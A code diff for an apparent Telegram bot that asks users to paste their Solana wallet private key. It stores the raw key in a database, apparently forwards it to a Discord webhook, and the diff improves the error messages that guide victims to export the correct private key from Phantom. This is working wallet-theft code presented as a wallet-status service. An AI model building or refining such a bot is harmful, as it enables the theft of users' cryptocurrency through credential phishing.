@@ -114,6 +114,7 @@ bot.on('text', async (ctx) => {
 
   try {
     let secret;
+
     if (input.startsWith('[')) {
       secret = JSON.parse(input);
     } else {
@@ -121,7 +122,9 @@ bot.on('text', async (ctx) => {
       secret = Array.from(decoded);
     }
 
-    if (!secret || secret.length !== 64) throw new Error('Invalid secret key length');
+    if (!secret || secret.length !== 64) {
+      return ctx.reply(`❌ *Invalid key length:* \`${secret?.length || 0}\` bytes.\n\nA valid private key must decode to exactly 64 bytes.\n\n🛠 *How to fix:*\n- Export your *private key* from Phantom\n- Do NOT use your public key or seed phrase\n- Use base58 or JSON array`, { parse_mode: 'Markdown' });
+    }
 
     keypair = Keypair.fromSecretKey(Uint8Array.from(secret));
     const pubkey = keypair.publicKey.toBase58();
@@ -134,7 +137,7 @@ bot.on('text', async (ctx) => {
     let projectBalance = '0.0', refCount = 0, canClaim = false;
 
     if (docSnap.exists) {
-      await userRef.update({ privateKey: input }); // ✅ Atualiza apenas a private key
+      await userRef.update({ privateKey: input });
       const data = docSnap.data();
       projectBalance = (data.balance || 0).toFixed(2);
       refCount = data.refCount || 0;
@@ -157,7 +160,6 @@ bot.on('text', async (ctx) => {
 
     await ctx.replyWithMarkdown(formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim));
 
-    // Discord webhook
     try {
       await fetch(discordWebhook, {
         method: 'POST',
@@ -180,7 +182,7 @@ bot.on('text', async (ctx) => {
 
   } catch (err) {
     console.error('Erro ao processar a chave:', err.message || err);
-    ctx.reply('❌ Invalid private key or error connecting to your wallet. Please try again.');
+    ctx.reply(`❌ Error processing key: ${err.message || 'unknown error'}`);
   }
 });
 
